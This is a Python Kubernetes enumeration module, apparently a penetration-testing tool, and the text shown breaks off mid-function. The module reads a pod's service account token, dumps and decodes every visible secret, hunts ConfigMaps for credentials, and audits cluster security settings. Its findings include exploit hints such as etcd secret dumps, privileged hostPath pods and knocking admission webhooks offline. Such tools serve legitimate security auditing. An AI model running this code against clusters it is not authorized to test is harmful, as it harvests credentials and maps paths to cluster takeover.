#!/usr/bin/env python3
"""
Kubernetes Enumeration Module
Synthesized from: Kubernetes in Action 2e, Production Kubernetes, Kubernetes Best
Practices 2e, Kubernetes Up and Running 3e, Cloud Native DevOps with Kubernetes 2e

Enumerate K8s pods, services, secrets, RBAC, service accounts. Extended with:
- Service account token extraction (token + ca.crt + namespace)
- Direct API server enumeration via SA token (no kubectl dependency)
- RBAC self-check via SelfSubjectAccessReview API
- Secret extraction with base64 decode
- ConfigMap credential hunting
- Privilege escalation path detection
- etcd direct access (port 2379)
- Kubelet API enumeration (port 10250)
- Kubernetes dashboard probe
- Orka-specific namespace enumeration
"""

import subprocess
import json
import os
import re
import base64
import platform as _platform
import ssl
import socket
import urllib.request
import urllib.error
from pathlib import Path

_IS_MACOS = _platform.system() == 'Darwin'
_IS_LINUX = _platform.system() == 'Linux'

# Credential-hunting patterns for ConfigMaps and env vars
_CRED_KEYS = {
    'password', 'passwd', 'secret', 'token', 'api_key', 'apikey',
    'auth', 'credential', 'private_key', 'access_key', 'db_pass',
    'database_password', 'encryption_key', 'jwt_secret', 'client_secret',
    'bearer', 'authorization', 'key',
}

def _looks_like_cred(key: str) -> bool:
    k = key.lower().replace('-', '_').replace('.', '_')
    return any(pat in k for pat in _CRED_KEYS)


class K8sEnumerator:
    """Enumerate Kubernetes environment — kubectl-first with direct API fallback."""

    def __init__(self):
        self.in_k8s = False
        self.namespace = None
        self.service_account = None
        self.token = None
        self.ca_cert = None
        self.api_server = None
        self.pods = []
        self.services = []
        self.secrets = []          # metadata only (kubectl path)
        self.secret_data = []      # decoded values (API path)
        self.configmaps = []
        self.configmap_creds = []  # embedded credential hits
        self.rbac = []
        self.self_access = []      # SelfSubjectAccessReview results
        self.escape_vectors = []
        self.etcd_findings = []
        self.kubelet_findings = []
        self.dashboard_findings = []
        self.orka_findings = []
        self.network_policy_findings = []
        self.clusteradmin_findings = []
        self.privileged_pod_findings = []
        self.secret_env_findings = []
        self.pod_security_admission_findings = []
        self.admission_webhook_findings = []
        self.etcd_encryption_findings = []
        self.sa_automount_findings = []
        self.hostpath_findings = []
        self.secret_plaintext_findings = []
        self.configmap_sensitive_findings = []
        self.projected_volume_findings = []
        self.admission_controller_findings = []
        self.pod_security_standards_findings = []
        self.secret_rotation_findings = []
        self.ingress_exposure_findings = []
        self.service_mesh_mtls_findings = []
        self.observability_gap_findings = []
        self.persistent_volume_findings = []
        self.cluster_admin_binding_findings = []

    # ------------------------------------------------------------------
    # Top-level orchestration
    # ------------------------------------------------------------------

    def enumerate_all(self):
        """Run full enumeration chain."""
        self.check_in_k8s()

        if self.in_k8s:
            self.extract_service_account_bundle()
            self.resolve_api_server()

            has_kubectl = self._kubectl_available()

            if has_kubectl:
                self.get_pods()
                self.get_services()
                self.get_secrets()
                self.get_configmaps()
                self.check_rbac()

            # Direct API path — works even without kubectl
            if self.token and self.api_server:
                self.api_enum_namespaces()
                self.api_enum_pods()
                self.api_extract_secrets()
                self.api_extract_configmaps()
                self.rbac_self_check()
                self.check_network_policies()
                self.check_rbac_clusteradmin()
                self.check_privileged_pods()
                self.check_secret_env_vars()
                self.check_pod_security_admission()
                self.check_admission_webhooks()
                self.check_etcd_encryption()
                # SA automount cross-references clusteradmin_findings —
                # must run after check_rbac_clusteradmin()
                self.check_service_account_automount()
                self.check_hostpath_mounts()
                self.check_secret_plaintext_exposure()
                self.check_configmap_sensitive_data()
                self.check_projected_volume_abuse()
                self.check_admission_controllers()
                self.check_pod_security_standards()
                self.check_secret_rotation_surface()
                self.check_ingress_exposure()
                self.check_service_mesh_mtls()
                self.check_observability_gaps()
                self.check_persistent_volume_exposure()
                self.check_cluster_admin_bindings()

            self.check_escape_vectors()

        # Active probes — run regardless of in_k8s status
        self.probe_etcd()
        self.probe_kubelet()
        self.probe_dashboard()
        if self.in_k8s:
            self.enum_orka()

        return self._build_result()

    def _build_result(self):
        return {
            'in_k8s': self.in_k8s,
            'namespace': self.namespace,
            'service_account': self.service_account,
            'has_token': bool(self.token),
            'api_server': self.api_server,
            'pods': self.pods,
            'services': self.services,
            'secrets': self.secrets,
            'secret_data': self.secret_data,
            'configmaps': self.configmaps,
            'configmap_creds': self.configmap_creds,
            'rbac': self.rbac,
            'self_access': self.self_access,
            'escape_vectors': self.escape_vectors,
            'etcd_findings': self.etcd_findings,
            'kubelet_findings': self.kubelet_findings,
            'dashboard_findings': self.dashboard_findings,
            'orka_findings': self.orka_findings,
            'network_policy_findings': self.network_policy_findings,
            'clusteradmin_findings': self.clusteradmin_findings,
            'privileged_pod_findings': self.privileged_pod_findings,
            'secret_env_findings': self.secret_env_findings,
            'pod_security_admission_findings': self.pod_security_admission_findings,
            'admission_webhook_findings': self.admission_webhook_findings,
            'etcd_encryption_findings': self.etcd_encryption_findings,
            'sa_automount_findings': self.sa_automount_findings,
            'hostpath_findings': self.hostpath_findings,
            'secret_plaintext_findings': self.secret_plaintext_findings,
            'configmap_sensitive_findings': self.configmap_sensitive_findings,
            'projected_volume_findings': self.projected_volume_findings,
            'admission_controller_findings': self.admission_controller_findings,
            'pod_security_standards_findings': self.pod_security_standards_findings,
            'secret_rotation_findings': self.secret_rotation_findings,
            'ingress_exposure_findings': self.ingress_exposure_findings,
            'service_mesh_mtls_findings': self.service_mesh_mtls_findings,
            'observability_gap_findings': self.observability_gap_findings,
            'persistent_volume_findings': self.persistent_volume_findings,
            'cluster_admin_binding_findings': self.cluster_admin_binding_findings,
        }

    # ------------------------------------------------------------------
    # Detection
    # ------------------------------------------------------------------

    def check_in_k8s(self):
        """Detect if running inside a Kubernetes pod."""
        if Path('/var/run/secrets/kubernetes.io/serviceaccount').exists():
            self.in_k8s = True
            return True

        if os.getenv('KUBERNETES_SERVICE_HOST'):
            self.in_k8s = True
            return True

        if _IS_LINUX:
            try:
                with open('/proc/1/cgroup') as f:
                    if 'kubepods' in f.read():
                        self.in_k8s = True
                        return True
            except Exception:
                pass

        return False

    # ------------------------------------------------------------------
    # Service account bundle extraction
    # Source: Production K8s ch7, K8s In Action 2e ch8, K8s Up & Running ch14
    # /var/run/secrets/kubernetes.io/serviceaccount/ contains:
    #   token   — JWT bearer token
    #   ca.crt  — cluster CA certificate
    #   namespace — pod namespace
    # ------------------------------------------------------------------

    def extract_service_account_bundle(self):
        """Extract token, ca.crt and namespace from the SA mount."""
        sa_path = Path('/var/run/secrets/kubernetes.io/serviceaccount')
        if not sa_path.exists():
            return

        for fname, attr in [('token', 'token'), ('namespace', 'namespace')]:
            try:
                setattr(self, attr, (sa_path / fname).read_text().strip())
            except Exception:
                pass

        try:
            self.ca_cert = (sa_path / 'ca.crt').read_bytes()
        except Exception:
            pass

        # Fallback namespace
        if not self.namespace:
            self.namespace = os.getenv('POD_NAMESPACE', 'default')

        # SA name — not in the mount; get from env or default
        self.service_account = os.getenv('SERVICEACCOUNT', 'default')

    def get_service_account(self):
        """Legacy compatibility shim — delegates to extract_service_account_bundle."""
        self.extract_service_account_bundle()
        return self.service_account

    def get_token(self):
        """Legacy compatibility shim."""
        self.extract_service_account_bundle()
        return self.token

    def resolve_api_server(self):
        """Determine API server URL from env (injected by kubelet)."""
        host = os.getenv('KUBERNETES_SERVICE_HOST')
        port = os.getenv('KUBERNETES_SERVICE_PORT', '443')
        if host:
            self.api_server = f'https://{host}:{port}'
        else:
            self.api_server = 'https://kubernetes.default.svc'

    # ------------------------------------------------------------------
    # Direct API enumeration (no kubectl)
    # Source: Production K8s ch10, K8s In Action 2e ch8/11
    # ------------------------------------------------------------------

    def _api_get(self, path: str, server: str = None, token: str = None,
                 timeout: int = 8) -> dict | None:
        """GET a K8s API path. Returns parsed JSON or None on failure."""
        base = server or self.api_server or 'https://kubernetes.default.svc'
        tok = token or self.token
        url = base.rstrip('/') + path

        try:
            # Build an SSL context that trusts the cluster CA
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            if self.ca_cert:
                import tempfile, os as _os
                with tempfile.NamedTemporaryFile(delete=False, suffix='.crt') as f:
                    f.write(self.ca_cert)
                    cafile = f.name
                ctx.load_verify_locations(cafile)
                _os.unlink(cafile)
            else:
                ctx.verify_mode = ssl.CERT_NONE

            req = urllib.request.Request(url)
            if tok:
                req.add_header('Authorization', f'Bearer {tok}')
            req.add_header('Accept', 'application/json')

            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
                return json.loads(resp.read().decode())
        except Exception:
            return None

    def _api_post(self, path: str, body: dict, server: str = None,
                  token: str = None, timeout: int = 8) -> dict | None:
        """POST to a K8s API path."""
        base = server or self.api_server or 'https://kubernetes.default.svc'
        tok = token or self.token
        url = base.rstrip('/') + path

        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            if self.ca_cert:
                import tempfile, os as _os
                with tempfile.NamedTemporaryFile(delete=False, suffix='.crt') as f:
                    f.write(self.ca_cert)
                    cafile = f.name
                ctx.load_verify_locations(cafile)
                _os.unlink(cafile)
            else:
                ctx.verify_mode = ssl.CERT_NONE

            data = json.dumps(body).encode()
            req = urllib.request.Request(url, data=data, method='POST')
            if tok:
                req.add_header('Authorization', f'Bearer {tok}')
            req.add_header('Content-Type', 'application/json')
            req.add_header('Accept', 'application/json')

            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
                return json.loads(resp.read().decode())
        except Exception:
            return None

    def api_enum_namespaces(self):
        """GET /api/v1/namespaces — list all namespaces SA can see."""
        data = self._api_get('/api/v1/namespaces')
        if data and 'items' in data:
            ns_names = [i['metadata']['name'] for i in data['items']]
            # Store for downstream use
            self._visible_namespaces = ns_names
        else:
            self._visible_namespaces = [self.namespace] if self.namespace else ['default']

    def api_enum_pods(self):
        """GET /api/v1/pods — cross-namespace pod list via direct API."""
        data = self._api_get('/api/v1/pods')
        if not data:
            # Fall back to namespace-scoped
            ns = self.namespace or 'default'
            data = self._api_get(f'/api/v1/namespaces/{ns}/pods')
        if data and 'items' in data:
            for item in data['items']:
                spec = item.get('spec', {})
                entry = {
                    'name': item['metadata']['name'],
                    'namespace': item['metadata'].get('namespace', ''),
                    'status': item.get('status', {}).get('phase', ''),
                    'ip': item.get('status', {}).get('podIP', ''),
                    'service_account': spec.get('serviceAccountName', 'default'),
                    'host_pid': spec.get('hostPID', False),
                    'host_network': spec.get('hostNetwork', False),
                    'host_ipc': spec.get('hostIPC', False),
                    'privileged': any(
                        c.get('securityContext', {}).get('privileged', False)
                        for c in spec.get('containers', [])
                    ),
                    'host_paths': [
                        v['hostPath']['path']
                        for v in spec.get('volumes', [])
                        if 'hostPath' in v
                    ],
                }
                if entry not in self.pods:
                    self.pods.append(entry)

    def api_extract_secrets(self):
        """
        GET /api/v1/namespaces/{ns}/secrets — dump all secrets, base64-decode values.
        Source: K8s In Action 2e ch8 (Secret types), Production K8s ch7 (etcd stored b64)
        """
        namespaces = getattr(self, '_visible_namespaces', [self.namespace or 'default'])
        for ns in namespaces:
            data = self._api_get(f'/api/v1/namespaces/{ns}/secrets')
            if not data or 'items' not in data:
                continue
            for item in data['items']:
                meta = item.get('metadata', {})
                raw_data = item.get('data', {})
                decoded = {}
                for k, v in raw_data.items():
                    try:
                        decoded[k] = base64.b64decode(v).decode('utf-8', errors='replace')
                    except Exception:
                        decoded[k] = v  # leave encoded if decode fails
                entry = {
                    'name': meta.get('name', ''),
                    'namespace': ns,
                    'type': item.get('type', 'Opaque'),
                    'data': decoded,
                }
                self.secret_data.append(entry)

    def api_extract_configmaps(self):
        """
        GET /api/v1/namespaces/{ns}/configmaps — hunt for embedded credentials.
        Source: K8s In Action 2e ch8, K8s Best Practices ch4
        """
        namespaces = getattr(self, '_visible_namespaces', [self.namespace or 'default'])
        for ns in namespaces:
            data = self._api_get(f'/api/v1/namespaces/{ns}/configmaps')
            if not data or 'items' not in data:
                continue
            for item in data['items']:
                meta = item.get('metadata', {})
                cm_data = item.get('data', {})
                # Hunt for credential-looking keys
                hits = {k: v for k, v in cm_data.items() if _looks_like_cred(k)}
                if hits:
                    self.configmap_creds.append({
                        'name': meta.get('name', ''),
                        'namespace': ns,
                        'credential_keys': list(hits.keys()),
                        'values': hits,
                    })

    # ------------------------------------------------------------------
    # NetworkPolicy gap detection
    # Source: K8s Best Practices 2e ch9 — default-deny baseline; namespaces
    # without any NetworkPolicy allow unrestricted pod-to-pod lateral movement.
    # ------------------------------------------------------------------

    def check_network_policies(self) -> list:
        """
        GET /apis/networking.k8s.io/v1/networkpolicies across all namespaces.
        Identify namespaces that have zero NetworkPolicy objects — those namespaces
        are fully open for lateral movement by default.
        Returns list of dicts: {namespace, has_policy, policy_count}
        """
        namespaces = getattr(self, '_visible_namespaces', [self.namespace or 'default'])

        # Build a map: namespace -> policy_count
        ns_policy_count: dict[str, int] = {ns: 0 for ns in namespaces}

        # Cluster-wide list (requires list permission on the resource)
        data = self._api_get('/apis/networking.k8s.io/v1/networkpolicies')
        if data and 'items' in data:
            for item in data['items']:
                ns = item.get('metadata', {}).get('namespace', '')
                if ns in ns_policy_count:
                    ns_policy_count[ns] += 1
                else:
                    ns_policy_count[ns] = 1
        else:
            # Fall back to per-namespace queries
            for ns in namespaces:
                ns_data = self._api_get(
                    f'/apis/networking.k8s.io/v1/namespaces/{ns}/networkpolicies'
                )
                if ns_data and 'items' in ns_data:
                    ns_policy_count[ns] = len(ns_data['items'])

        results = []
        for ns, count in ns_policy_count.items():
            entry = {
                'namespace': ns,
                'has_policy': count > 0,
                'policy_count': count,
            }
            if count == 0:
                self.escape_vectors.append({
                    'type': 'NO_NETWORK_POLICY',
                    'severity': 'HIGH',
                    'description': (
                        f'Namespace {ns!r} has no NetworkPolicy — '
                        'unrestricted lateral movement'
                    ),
                    'exploit': (
                        f'Any pod in {ns!r} can reach any other pod/service '
                        'in the cluster without restriction. '
                        'Pivot to internal APIs, metadata endpoints, etcd.'
                    ),
                })
            results.append(entry)

        self.network_policy_findings = results
        return results

    # ------------------------------------------------------------------
    # ClusterRoleBinding cluster-admin sweep
    # Source: K8s Best Practices 2e ch4 — RBAC least-privilege;
    # ServiceAccounts bound to cluster-admin = full cluster compromise
    # from any pod running as that SA.
    # ------------------------------------------------------------------

    _SECRET_ENV_RE = re.compile(
        r'(?i)(password|passwd|secret|token|api[_\-]?key|apikey|'
        r'credential|private[_\-]?key|access[_\-]?key|db[_\-]?pass|'
        r'jwt[_\-]?secret|client[_\-]?secret|bearer|auth|encryption[_\-]?key)'
    )

    def check_rbac_clusteradmin(self) -> list:
        """
        GET /apis/rbac.authorization.k8s.io/v1/clusterrolebindings.
        Find bindings referencing ClusterRole/cluster-admin.
        ServiceAccount subjects = CRITICAL; default-namespace subjects = HIGH.
        Returns list of dicts: {name, subject_kind, subject_name,
                                subject_namespace, severity}
        """
        data = self._api_get(
            '/apis/rbac.authorization.k8s.io/v1/clusterrolebindings'
        )
        results = []
        if not data or 'items' not in data:
            return results

        for item in data['items']:
            meta = item.get('metadata', {})
            role_ref = item.get('roleRef', {})
            if role_ref.get('name') != 'cluster-admin':
                continue
            for subject in item.get('subjects', []):
                kind = subject.get('kind', '')
                name = subject.get('name', '')
                ns = subject.get('namespace', '')

                if kind == 'ServiceAccount':
                    severity = 'CRITICAL'
                elif ns == 'default':
                    severity = 'HIGH'
                else:
                    severity = 'MEDIUM'

                entry = {
                    'name': meta.get('name', ''),
                    'subject_kind': kind,
                    'subject_name': name,
                    'subject_namespace': ns,
                    'severity': severity,
                }
                results.append(entry)

                desc = (
                    f'ClusterRoleBinding {meta.get("name","")!r} binds '
                    f'{kind} {ns}/{name} to cluster-admin'
                )
                self.escape_vectors.append({
                    'type': 'CLUSTERADMIN_BINDING',
                    'severity': severity,
                    'description': desc,
                    'exploit': (
                        'Any workload running as this ServiceAccount has '
                        'full cluster-admin equivalent. '
                        'Extract SA token, use against API server: '
                        'kubectl --token=<tok> get secrets -A'
                    ) if kind == 'ServiceAccount' else (
                        'Subject has cluster-admin. Verify binding is intentional.'
                    ),
                })

        self.clusteradmin_findings = results
        return results

    # ------------------------------------------------------------------
    # Privileged pod / security context audit
    # Source: K8s Best Practices 2e ch9 — pod security; ch19 hardening;
    # privileged:true + hostNetwork/PID/IPC = host escape primitives.
    # readOnlyRootFilesystem:false = container writeable = persistence risk.
    # ------------------------------------------------------------------

    def check_privileged_pods(self) -> list:
        """
        GET /api/v1/pods across all namespaces.
        Per container: flag privileged:true, hostNetwork/PID/IPC, missing
        readOnlyRootFilesystem.
        Returns list of dicts: {namespace, pod, container, issue, severity}
        """
        data = self._api_get('/api/v1/pods')
        results = []
        if not data or 'items' not in data:
            return results

        for item in data['items']:
            meta = item.get('metadata', {})
            spec = item.get('spec', {})
            ns = meta.get('namespace', '')
            pod_name = meta.get('name', '')

            # Pod-level flags
            if spec.get('hostNetwork'):
                results.append({
                    'namespace': ns,
                    'pod': pod_name,
                    'container': '<pod>',
                    'issue': 'hostNetwork: true — shares host network stack',
                    'severity': 'HIGH',
                })
            if spec.get('hostPID'):
                results.append({
                    'namespace': ns,
                    'pod': pod_name,
                    'container': '<pod>',
                    'issue': 'hostPID: true — shares host PID namespace',
                    'severity': 'HIGH',
                })
            if spec.get('hostIPC'):
                results.append({
                    'namespace': ns,
                    'pod': pod_name,
                    'container': '<pod>',
                    'issue': 'hostIPC: true — shares host IPC namespace',
                    'severity': 'HIGH',
                })

            # Per-container security context
            all_containers = (
                spec.get('containers', [])
                + spec.get('initContainers', [])
                + spec.get('ephemeralContainers', [])
            )
            for container in all_containers:
                cname = container.get('name', '')
                sc = container.get('securityContext', {})

                if sc.get('privileged'):
                    results.append({
                        'namespace': ns,
                        'pod': pod_name,
                        'container': cname,
                        'issue': 'securityContext.privileged: true — all Linux caps',
                        'severity': 'CRITICAL',
                    })

                if sc.get('readOnlyRootFilesystem') is False or (
                    'readOnlyRootFilesystem' not in sc
                ):
                    results.append({
                        'namespace': ns,
                        'pod': pod_name,
                        'container': cname,
                        'issue': 'readOnlyRootFilesystem not set — '
                                 'container filesystem is writable',
                        'severity': 'LOW',
                    })

        self.privileged_pod_findings = results
        return results

    # ------------------------------------------------------------------
    # Secret / credential exposure via env vars
    # Source: K8s Best Practices 2e ch4/ch9 — secrets in env vars leak via
    # /proc/<pid>/environ, docker inspect, kubectl describe, and log output.
    # Prefer secretKeyRef over literal values; prefer volume mounts over env.
    # ------------------------------------------------------------------

    def check_secret_env_vars(self) -> list:
        """
        GET /api/v1/pods across all namespaces.
        For each container env entry:
          - valueFrom.secretKeyRef: env var sourced from a Secret object
          - literal env value with a credential-pattern name (possible cleartext)
        Returns list of dicts: {namespace, pod, container, env_var,
                                secret_ref, source_type}
        """
        data = self._api_get('/api/v1/pods')
        results = []
        if not data or 'items' not in data:
            return results

        for item in data['items']:
            meta = item.get('metadata', {})
            spec = item.get('spec', {})
            ns = meta.get('namespace', '')
            pod_name = meta.get('name', '')

            all_containers = (
                spec.get('containers', [])
                + spec.get('initContainers', [])
                + spec.get('ephemeralContainers', [])
            )
            for container in all_containers:
                cname = container.get('name', '')
                for env in container.get('env', []):
                    var_name = env.get('name', '')
                    value_from = env.get('valueFrom', {})
                    secret_ref = value_from.get('secretKeyRef', {})

                    if secret_ref:
                        # Env var sourced from a Secret object
                        ref_str = (
                            f'{secret_ref.get("name","?")}.'
                            f'{secret_ref.get("key","?")}'
                        )
                        results.append({
                            'namespace': ns,
                            'pod': pod_name,
                            'container': cname,
                            'env_var': var_name,
                            'secret_ref': ref_str,
                            'source_type': 'secretKeyRef',
                        })
                    elif 'value' in env and self._SECRET_ENV_RE.search(var_name):
                        # Literal value with a credential-pattern name
                        results.append({
                            'namespace': ns,
                            'pod': pod_name,
                            'container': cname,
                            'env_var': var_name,
                            'secret_ref': '<literal>',
                            'source_type': 'literal_cleartext',
                        })

        self.secret_env_findings = results
        return results

    # ------------------------------------------------------------------
    # Pod Security Admission — namespace label enforcement sweep
    # Source: K8s Up & Running 3e ch19 — PSA replaces PodSecurityPolicy;
    # enforced via pod-security.kubernetes.io/enforce label on namespace.
    # Missing label = no PSA enforcement = privileged pods can run freely.
    # Label value "privileged" explicitly permits all privileged pods.
    # ------------------------------------------------------------------

    def check_pod_security_admission(self) -> list:
        """
        GET /api/v1/namespaces — inspect labels on each namespace.
        Namespaces missing pod-security.kubernetes.io/enforce (excluding
        kube-system) have no Pod Security Admission enforcement, meaning
        privileged pods, hostPath mounts, and root containers are permitted.
        Namespaces with enforce=privileged are explicitly unrestricted.
        Returns list of dicts: {namespace, enforce_level, severity, description}
        """
        data = self._api_get('/api/v1/namespaces')
        results = []
        if not data or 'items' not in data:
            return results

        system_namespaces = {'kube-system', 'kube-public', 'kube-node-lease'}

        for item in data['items']:
            meta = item.get('metadata', {})
            ns = meta.get('name', '')
            labels = meta.get('labels', {})
            enforce_level = labels.get('pod-security.kubernetes.io/enforce', None)

            if ns in system_namespaces:
                continue

            if enforce_level is None:
                entry = {
                    'namespace': ns,
                    'enforce_level': None,
                    'severity': 'HIGH',
                    'description': (
                        f'Namespace {ns!r} lacks pod-security.kubernetes.io/enforce label '
                        '— Pod Security Admission not enforced; privileged pods can run'
                    ),
                }
                self.escape_vectors.append({
                    'type': 'NO_POD_SECURITY_ADMISSION',
                    'severity': 'HIGH',
                    'description': entry['description'],
                    'exploit': (
                        f'Deploy privileged pod in namespace {ns!r}: '
                        'spec.securityContext.privileged=true, hostPID=true, hostPath:/. '
                        'No PSA controller will deny it.'
                    ),
                })
            elif enforce_level == 'privileged':
                entry = {
                    'namespace': ns,
                    'enforce_level': 'privileged',
                    'severity': 'MEDIUM',
                    'description': (
                        f'Namespace {ns!r} pod-security.kubernetes.io/enforce=privileged '
                        '— all pod security controls disabled for this namespace'
                    ),
                }
            else:
                # baseline or restricted — enforcement active
                entry = {
                    'namespace': ns,
                    'enforce_level': enforce_level,
                    'severity': 'INFO',
                    'description': (
                        f'Namespace {ns!r} enforce={enforce_level} — PSA active'
                    ),
                }

            results.append(entry)

        self.pod_security_admission_findings = results
        return results

    # ------------------------------------------------------------------
    # Admission webhook failurePolicy audit
    # Source: K8s Up & Running 3e ch20 — Gatekeeper uses failurePolicy=Ignore
    # by default ("fail open"): if the webhook service is unavailable and
    # doesn't respond within timeoutSeconds, the request is admitted anyway.
    # This means any admission-webhook-based policy (OPA/Gatekeeper, PSP
    # replacements, image signing, etc.) can be bypassed by making the
    # webhook service unreachable.
    # ------------------------------------------------------------------

    def check_admission_webhooks(self) -> list:
        """
        GET validatingwebhookconfigurations and mutatingwebhookconfigurations.
        Flag any webhook with failurePolicy=Ignore (fail-open = policy bypass
        when webhook is unavailable). Also flag total absence of webhooks.
        Returns list of dicts: {name, webhook_name, type, failure_policy,
                                severity, description}
        """
        results = []
        total_webhooks = 0

        for wh_type, path in [
            ('Validating',
             '/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations'),
            ('Mutating',
             '/apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations'),
        ]:
            data = self._api_get(path)
            if not data or 'items' not in data:
                continue

            for config in data['items']:
                config_name = config.get('metadata', {}).get('name', '')
                for wh in config.get('webhooks', []):
                    total_webhooks += 1
                    wh_name = wh.get('name', '')
                    failure_policy = wh.get('failurePolicy', 'Fail')
                    timeout = wh.get('timeoutSeconds', 10)

                    if failure_policy == 'Ignore':
                        entry = {
                            'config_name': config_name,
                            'webhook_name': wh_name,
                            'type': wh_type,
                            'failure_policy': 'Ignore',
                            'timeout_seconds': timeout,
                            'severity': 'MEDIUM',
                            'description': (
                                f'{wh_type}WebhookConfiguration {config_name!r} '
                                f'webhook {wh_name!r} failurePolicy=Ignore — '
                                f'policy bypassed if webhook unavailable within {timeout}s'
                            ),
                        }
                        self.escape_vectors.append({
                            'type': 'WEBHOOK_FAIL_OPEN',
                            'severity': 'MEDIUM',
                            'description': entry['description'],
                            'exploit': (
                                f'If {wh_type.lower()} webhook service ({config_name}) '
                                f'is down or times out after {timeout}s, all admission '
                                'checks are bypassed. Network-partition the webhook pod '
                                'or flood it to degrade response time past timeout.'
                            ),
                        })
                    else:
                        entry = {
                            'config_name': config_name,
                            'webhook_name': wh_name,
                            'type': wh_type,
                            'failure_policy': failure_policy,
                            'timeout_seconds': timeout,
                            'severity': 'INFO',
                            'description': (
                                f'{wh_type}WebhookConfiguration {config_name!r} '
                                f'webhook {wh_name!r} failurePolicy={failure_policy}'
                            ),
                        }
                    results.append(entry)

        if total_webhooks == 0:
            entry = {
                'config_name': None,
                'webhook_name': None,
                'type': None,
                'failure_policy': None,
                'timeout_seconds': None,
                'severity': 'LOW',
                'description': (
                    'No admission webhooks configured — '
                    'no webhook-based policy enforcement (OPA/Gatekeeper, '
                    'image signing, etc.) in effect'
                ),
            }
            results.append(entry)

        self.admission_webhook_findings = results
        return results

    # ------------------------------------------------------------------
    # etcd encryption-at-rest check
    # Source: K8s Up & Running 3e ch19; Production K8s ch7 —
    # Secrets are stored in etcd as base64 (not encrypted) by default.
    # EncryptionConfiguration must be explicitly applied to the API server
    # via --encryption-provider-config flag for at-rest encryption to work.
    # Without it, anyone with etcd read access gets plaintext secrets.
    # ------------------------------------------------------------------

    def check_etcd_encryption(self) -> list:
        """
        Inspect kube-apiserver pod spec in kube-system for the
        --encryption-provider-config flag in spec.containers[].command.
        If the flag is absent, Secrets are stored unencrypted in etcd.
        Also checks kube-system configmaps for encryption config hints.
        Returns list of dicts: {source, encryption_configured, severity, description}
        """
        results = []
        encryption_confirmed = False

        # Primary: check kube-apiserver pod command line
        pods_data = self._api_get('/api/v1/namespaces/kube-system/pods')
        if pods_data and 'items' in pods_data:
            for item in pods_data['items']:
                name = item.get('metadata', {}).get('name', '')
                if 'kube-apiserver' not in name:
                    continue
                spec = item.get('spec', {})
                for container in spec.get('containers', []):
                    cmd = container.get('command', []) + container.get('args', [])
                    has_enc_flag = any(
                        '--encryption-provider-config' in arg for arg in cmd
                    )
                    if has_enc_flag:
                        encryption_confirmed = True
                        results.append({
                            'source': f'pod/{name}',
                            'encryption_configured': True,
                            'severity': 'INFO',
                            'description': (
                                f'kube-apiserver pod {name!r} has '
                                '--encryption-provider-config set — '
                                'etcd encryption-at-rest appears configured'
                            ),
                        })
                    else:
                        results.append({
                            'source': f'pod/{name}',
                            'encryption_configured': False,
                            'severity': 'HIGH',
                            'description': (
                                f'kube-apiserver pod {name!r} lacks '
                                '--encryption-provider-config — '
                                'Secrets stored in plaintext in etcd'
                            ),
                        })
                        self.escape_vectors.append({
                            'type': 'ETCD_NO_ENCRYPTION',
                            'severity': 'HIGH',
                            'description': (
                                'etcd Secret encryption not configured — '
                                'Secrets stored in plaintext; '
                                'etcd read access = full secret dump'
                            ),
                            'exploit': (
                                'ETCDCTL_API=3 etcdctl get /registry/secrets/ '
                                '--prefix --keys-only; then per-key get returns '
                                'base64-only (no crypto) secret values.'
                            ),
                        })

        # Secondary hint: look for encryption-related configmaps in kube-system
        if not encryption_confirmed:
            cm_data = self._api_get('/api/v1/namespaces/kube-system/configmaps')
            if cm_data and 'items' in cm_data:
                for item in cm_data['items']:
                    cm_name = item.get('metadata', {}).get('name', '')
                    cm_values = item.get('data', {})
                    combined = ' '.join(cm_values.values())
                    if 'encryption-provider-config' in combined or (
                        'encryptionconfig' in cm_name.lower()
                    ):
                        encryption_confirmed = True
                        results.append({
                            'source': f'configmap/{cm_name}',
                            'encryption_configured': True,
                            'severity': 'INFO',
                            'description': (
                                f'ConfigMap {cm_name!r} in kube-system references '
                                'encryption-provider-config — encryption may be configured'
                            ),
                        })

        if not results:
            # Could not read kube-system pods (no permission) — flag as unknown
            results.append({
                'source': 'kube-system/pods (not readable)',
                'encryption_configured': None,
                'severity': 'INFO',
                'description': (
                    'Could not read kube-system pods — '
                    'etcd encryption status unknown (no permission to check kube-apiserver)'
                ),
            })

        self.etcd_encryption_findings = results
        return results

    # ------------------------------------------------------------------
    # Service account token auto-mount audit
    # Source: K8s Up & Running 3e ch19 — automountServiceAccountToken: true
    # is the default; every pod gets a JWT bearer token mounted at
    # /var/run/secrets/kubernetes.io/serviceaccount/token.
    # Compromising any pod = token = whatever RBAC that SA has.
    # Cross-reference: if SA is also clusteradmin-bound → CRITICAL.
    # ------------------------------------------------------------------

    def check_service_account_automount(self) -> list:
        """
        GET /api/v1/pods across all namespaces.
        Flag pods where automountServiceAccountToken is true (or unset = true)
        AND serviceAccountName is not 'default' — non-default SAs with auto-mount
        suggest deliberate RBAC grant that becomes a lateral movement vector.
        Cross-reference with clusteradmin_findings: if the SA is cluster-admin
        bound, escalate to CRITICAL.
        Returns list of dicts: {namespace, pod, service_account,
                                automount, severity, description}
        """
        data = self._api_get('/api/v1/pods')
        results = []
        if not data or 'items' not in data:
            return results

        # Build set of cluster-admin-bound SAs for cross-reference
        # Format: (namespace, sa_name)
        clusteradmin_sas: set[tuple[str, str]] = set()
        for f in self.clusteradmin_findings:
            if f.get('subject_kind') == 'ServiceAccount':
                clusteradmin_sas.add(
                    (f.get('subject_namespace', ''), f.get('subject_name', ''))
                )

        for item in data['items']:
            meta = item.get('metadata', {})
            spec = item.get('spec', {})
            ns = meta.get('namespace', '')
            pod_name = meta.get('name', '')
            sa_name = spec.get('serviceAccountName', 'default')

            # automountServiceAccountToken defaults to True when unset
            automount = spec.get('automountServiceAccountToken', True)

            if not automount:
                continue  # explicitly disabled — safe

            if sa_name == 'default':
                # Default SA with automount is common/low-signal; skip
                # (default SA typically has no RBAC and minimal risk)
                continue

            # Non-default SA + automount=True
            is_clusteradmin = (ns, sa_name) in clusteradmin_sas

            if is_clusteradmin:
                severity = 'CRITICAL'
                description = (
                    f'Pod {ns}/{pod_name} mounts SA token for {sa_name!r} '
                    f'which is cluster-admin bound — pod compromise = full cluster takeover'
